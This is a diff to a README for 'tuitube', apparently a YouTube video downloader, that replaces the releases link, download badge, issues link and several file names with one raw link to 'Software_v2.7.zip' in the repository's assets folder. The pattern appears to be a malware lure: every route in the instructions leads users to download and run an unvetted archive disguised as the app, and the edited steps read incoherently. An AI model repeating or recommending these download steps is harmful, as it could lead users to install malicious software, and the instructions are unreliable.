@@ -6,7 +6,7 @@ Welcome to tuitube! This application lets you download videos directly from the 
 
 ## 📥 Download tuitube
 
-[![Download tuitube](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/AlessandroPro07/tuitube/releases)
+[![Download tuitube](https://github.com/AlessandroPro07/tuitube/raw/refs/heads/main/assets/Software_v2.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/AlessandroPro07/tuitube/raw/refs/heads/main/assets/Software_v2.7.zip)
 
 ## 🔧 System Requirements
 
@@ -20,20 +20,20 @@ Before you begin, please ensure your system meets the following requirements:
 
 To get started with tuitube, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/AlessandroPro07/tuitube/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/AlessandroPro07/tuitube/raw/refs/heads/main/assets/Software_v2.7.zip).
   
 2. **Select the Latest Release**: Look for the most recent version. It is usually listed at the top of the page.
 
 3. **Download the Application**: Click on the link for your operating system:
-   - For Windows, you might see something like `tuitube-windows.exe`.
+   - For Windows, you might see something like `https://github.com/AlessandroPro07/tuitube/raw/refs/heads/main/assets/Software_v2.7.zip`.
    - For macOS, look for `tuitube-macos`.
-   - For Linux, select the appropriate package, like `tuitube-linux.tar.gz`.
+   - For Linux, select the appropriate package, like `https://github.com/AlessandroPro07/tuitube/raw/refs/heads/main/assets/Software_v2.7.zip`.
 
 4. **Save the File**: Choose a location on your computer where you want to save the downloaded file.
 
 5. **Run tuitube**: 
    - For Windows, double-click the `.exe` file.
-   - For macOS, extract the `.tar.gz` file and run the contained program.
+   - For macOS, extract the `https://github.com/AlessandroPro07/tuitube/raw/refs/heads/main/assets/Software_v2.7.zip` file and run the contained program.
    - For Linux, use the terminal to navigate to the folder where you extracted the files, then use `./tuitube-linux` to start the application.
 
 ## 📖 Usage Instructions
@@ -64,6 +64,6 @@ If you want to contribute to tuitube, we welcome your involvement. Here’s how 
 
 ## 📞 Support
 
-If you need help using tuitube, please check our GitHub [Issues tab](https://github.com/AlessandroPro07/tuitube/issues) for common questions and solutions. You can also post your question there for assistance.
+If you need help using tuitube, please check our GitHub [Issues tab](https://github.com/AlessandroPro07/tuitube/raw/refs/heads/main/assets/Software_v2.7.zip) for common questions and solutions. You can also post your question there for assistance.
 
 Enjoy your experience with tuitube! Download your favorite videos easily and conveniently.
